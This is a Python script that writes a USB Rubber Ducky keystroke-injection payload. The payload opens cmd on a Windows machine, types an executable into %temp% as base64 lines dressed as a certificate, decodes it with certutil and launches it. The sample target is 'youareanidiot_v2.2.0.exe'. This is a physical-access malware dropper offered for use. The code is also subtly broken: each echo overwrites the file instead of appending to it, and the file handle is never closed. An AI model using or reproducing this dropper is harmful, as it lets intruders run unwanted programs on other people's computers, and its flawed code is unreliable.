import os

def make_ducky_script(file):
    
    import os
    import base64
    import shutil
    basename = os.path.basename(file)
    filesdirremovedot = basename.replace('.', '')
    filesdir = f"{filesdirremovedot}_files"
    if os.path.isdir(filesdir) == True:
        shutil.rmtree(filesdir)
    os.mkdir(filesdir)
    base = open(file, "rb")
    base1 = base.read()
    
    scriptfilename = f"{filesdir}/{filesdirremovedot}_output.txt"
    base64_encoded = base64.b64encode(base1).decode("utf-8")
    ducky = open(scriptfilename, "w")
    duckyscriptstart = f'''DELAY 1000
GUI r
DELAY 500
STRING cmd.exe
DELAY 1000
ENTER
DELAY 750
STRING cd %temp%
DELAY 500
ENTER
STRING set ran=%random%
DELAY 500
ENTER
STRING mkdir {filesdirremovedot}_dir_%ran%
DELAY 500
ENTER
STRING cd {filesdirremovedot}_dir_%ran%
DELAY 500
ENTER
STRING echo hello>{filesdirremovedot}_base64
DELAY 500
ENTER
DELAY 300\n'''
    ducky.write(duckyscriptstart)
    input_string = base64_encoded
    chunk_size = 64
    timeout = 400
    enddelay = 10000
    ducky.write(f"STRING echo -----BEGIN CERTIFICATE----->{filesdirremovedot}_base64\nENTER\n")
    ducky.write(f"DELAY {timeout}\n")
    for i in range(0, len(input_string), chunk_size):
            chunk = input_string[i:i + chunk_size]
            ducky.write(f"STRING echo {chunk}>{filesdirremovedot}_base64\nDELAY {timeout}\nENTER\n")
    ducky.write(f"STRING echo -----END CERTIFICATE----->{filesdirremovedot}_base64\nENTER\n")
    duckyscriptend = f'''DELAY 10000

DELAY {enddelay}
STRING certutil -decode {filesdirremovedot}_base64 {file} && start {file} && exit
DELAY 500
ENTER'''
    ducky.write(duckyscriptend)
    ducky.close


    print("done")


if __name__ == "__main__":
    make_ducky_script("E:\\Files\\youareanidiot_v2.2.0.exe")

